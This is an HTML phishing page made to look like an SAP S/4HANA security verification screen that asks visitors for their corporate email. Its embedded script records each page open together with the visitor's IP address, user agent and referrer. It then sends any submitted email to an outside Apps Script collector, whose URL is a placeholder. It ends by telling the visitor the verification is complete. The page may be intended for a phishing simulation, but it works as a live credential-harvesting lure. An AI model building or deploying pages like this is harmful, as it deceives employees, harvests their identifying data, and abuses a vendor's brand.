<!DOCTYPE html>
<html>
<head>

<title>SAP S/4HANA Security Update</title>

<style>

body{
font-family:Arial;
background:#f4f6f8;
text-align:center;
margin-top:120px;
}

.box{
background:white;
width:380px;
padding:40px;
margin:auto;
border-radius:8px;
box-shadow:0 0 10px rgba(0,0,0,0.2);
}

input{
width:90%;
padding:10px;
margin:10px;
}

button{
background:#0070f2;
color:white;
padding:10px 20px;
border:none;
cursor:pointer;
}

</style>

</head>

<body>

<div class="box">

<h2>SAP S/4HANA Security Verification</h2>

<p>Please confirm your corporate email to continue.</p>

<form id="emailForm">

<input type="email" id="email" placeholder="Corporate Email" required>

<button type="submit">Confirm</button>

</form>

</div>

<script>

const SCRIPT_URL = "PASTE_APPS_SCRIPT_URL_HERE";

let userIP = "";

async function getIP(){

const res = await fetch("https://api.ipify.org?format=json");
const data = await res.json();
userIP = data.ip;

}

async function logClick(){

await fetch(SCRIPT_URL,{
method:"POST",
body:JSON.stringify({
event:"PAGE_OPEN",
email:"[LINK_OPENED - no email yet]",
ip:userIP,
userAgent:navigator.userAgent,
referrer:document.referrer
})
});

}

document.getElementById("emailForm").addEventListener("submit", async function(e){

e.preventDefault();

const email = document.getElementById("email").value;

await fetch(SCRIPT_URL,{
method:"POST",
body:JSON.stringify({
event:"EMAIL_SUBMITTED",
email:email,
ip:userIP,
userAgent:navigator.userAgent,
referrer:document.referrer
})
});

document.body.innerHTML = "<h2>Thank you. Your SAP verification is completed.</h2>";

});

async function init(){

await getIP();
await logClick();

}

init();

</script>

</body>
</html>
